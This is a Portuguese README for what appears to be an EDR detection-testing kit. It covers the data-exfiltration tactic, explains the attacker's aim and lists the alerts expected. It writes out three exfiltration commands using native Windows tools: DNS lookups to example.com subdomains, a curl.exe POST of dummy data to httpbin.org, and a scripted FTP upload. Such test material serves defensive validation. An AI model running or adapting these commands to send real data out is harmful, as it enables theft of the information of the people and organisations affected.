# 14. Exfiltracao de Dados (Exfiltration)

[English](../en/14-exfiltracao/README.md) | **Portugues**

**Tatica MITRE ATT&CK:** Exfiltration
**IDs:** T1048.003, T1048, T1567
**Severidade esperada:** Alta
**Precisa de admin:** Nao
**Destrutivo:** Nao

Esta pasta mostra tres canais de exfiltracao, todos com ferramentas nativas do Windows. Os dados enviados sao de mentira, apenas o texto teste, so para gerar o comportamento de saida de dados. Nenhuma informacao real sai da maquina.

## Para que serve, na visao do atacante

Depois de encontrar o que quer, por exemplo documentos, senhas ou bancos de dados, o atacante precisa tirar isso de dentro da empresa sem ser percebido. Ele esconde os dados dentro de trafego que parece normal, como consultas de DNS ou uma requisicao web comum.

## Por que e perigoso

A exfiltracao e o roubo em si, o momento em que a informacao sai da empresa. E a parte que gera o prejuizo direto, o vazamento, a multa por LGPD, a perda de segredo de negocio. E muitas vezes passa despercebida, porque vai disfarcada de trafego legitimo. Detectar dados saindo por canais incomuns e uma das validacoes mais importantes.

## Analogia

O ladrao ja separou as joias. Agora precisa tira-las do predio. Em vez de sair pela porta com uma sacola chamativa, ele esconde cada joia dentro de cartas comuns e vai postando uma a uma na caixa de correio, sem ninguem notar.

## Os tres canais mostrados

### Canal 1, DNS (T1048.003)

Esconde dados dentro de nomes de dominio consultados. Cada consulta leva um pedaco da informacao.

```cmd
nslookup dados-teste-01.example.com
nslookup dados-teste-02.example.com
```

### Canal 2, HTTP (T1567)

Envia dados em uma requisicao web, usando o curl.exe que ja vem no Windows 10 e 11.

```cmd
curl.exe -s -X POST -d "dados=teste" https://httpbin.org/post
```

### Canal 3, FTP (T1048)

Usa o cliente FTP nativo com um roteiro automatizado para enviar um arquivo.

```cmd
ftp -s:roteiro-ftp.txt
```

## O que o EDR deve detectar

* Volume incomum de consultas DNS com nomes estranhos, possivel tunel de DNS.
* Envio de dados por HTTP a partir de uma ferramenta de linha de comando.
* Conexao FTP de saida iniciada por script.
* Classificacao como Exfiltration, severidade alta.

## Pre requisitos

* Acesso a internet na VM de teste, para os canais HTTP e DNS.

## Limpeza

* O script apaga os arquivos temporarios que cria, por exemplo o roteiro de FTP. Nada mais e deixado no disco.
